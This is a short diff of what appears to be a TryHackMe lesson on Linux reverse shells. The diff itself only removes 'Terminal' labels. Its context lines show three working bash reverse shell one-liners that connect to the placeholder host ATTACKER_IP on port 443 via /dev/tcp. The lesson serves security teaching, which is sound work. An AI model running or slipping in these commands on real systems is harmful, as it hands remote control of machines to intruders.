@@ -146,8 +146,6 @@ Let's explore some of these payloads that can be used in the Linux OS to expo
 
 **Normal Bash Reverse Shell**
 
-Terminal
-
 ```shell-session
 target@tryhackme:~$ bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1 
 ```
@@ -157,8 +155,6 @@ This reverse shell initiates an interactive bash shell that redirects input and
   
 
 **Bash Read Line** **Reverse Shell**
-
-Terminal
 
 ```shell-session
 target@tryhackme:~$ exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done 
@@ -170,7 +166,6 @@ This reverse shell creates a new file descriptor (`5` in this case)  and conn
 
 **Bash With File Descriptor 196** **Reverse Shell**
 
-Terminal
 
 ```shell-session
 target@tryhackme:~$ 0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196 
